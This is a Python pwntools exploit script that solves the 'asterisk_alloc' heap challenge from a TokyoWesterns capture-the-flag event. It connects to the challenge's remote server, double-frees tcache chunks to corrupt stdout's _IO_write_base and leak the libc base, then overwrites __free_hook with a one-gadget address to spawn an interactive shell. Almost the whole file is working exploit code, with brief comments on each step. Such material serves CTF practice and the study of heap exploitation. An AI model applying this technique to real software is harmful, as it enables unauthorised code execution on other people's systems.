#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
context.log_level = 'debug'
#r = process('./asterisk_alloc', env={'LD_PRELOAD': './libc.so.6'})
r = remote('ast-alloc.chal.ctf.westerns.tokyo', 10001)
libc = ELF('./libc.so.6')

def malloc(n, s):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('Size: ', str(n))
    r.sendafter('Data: ', s)

def calloc(n, s):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('Size: ', str(n))
    r.sendafter('Data: ', s)

def realloc(n, s):
    r.sendlineafter('choice: ', '3')
    r.sendlineafter('Size: ', str(n))
    if n != -1:
        r.sendafter('Data: ', s)

def free(c):
    r.sendlineafter('choice: ', '4')
    r.sendlineafter('Which: ', c)

realloc(0x28, 'A')

free('r')
free('r')

# fail realloc to reset ptr to NULL
# overwrite next ptr onto fake chunk
realloc(-1, '')
realloc(0x28, '\x98')

# malloc size > tcache max size to get libc address
realloc(-1, '')
realloc(1400, 'A')

# calloc in advence
# to avoid "malloc(): memory corruption" if we calloc after we wrote _IO_write_base
calloc(0x200, 'A')

free('r')
realloc(-1, '')

# fake tcache chunk
realloc(0x100, '\x30'.ljust(8, '\0') + '\x60\x77') # guess stdout offset ?760
realloc(-1, '')


realloc(0x28, 'A')
realloc(-1, '')

# instead of using realloc, use malloc here to avoid realloc's *Little security check*
# __builtin_expect ((uintptr_t) oldp > (uintptr_t) -oldsize, 0)
# the code snippet below will fail the check
# realloc(0x28, 'A')
# realloc(-1, '') <-- fail here
malloc(0x28, 'A')

# overwrite _IO_write_base to leak libc address
realloc(0x28, p64(0x00000000fbad2887 + 0x1000) + p64(0) * 3 + '\x08')
libc.address = u64(r.recvn(6)+'\0\0') - 0x3ed8b0
print 'libc base:', hex(libc.address)
realloc(-1, '')

magic = libc.address + 0x4f322 # 0x10a38c, 0x4f2c5


# get shell
free('c')
free('c')
realloc(0x200, p64(libc.symbols['__free_hook']))
realloc(-1, '')
realloc(0x200, 'A')
realloc(-1, '')
realloc(0x200, p64(magic))
free('c')

r.interactive('>')
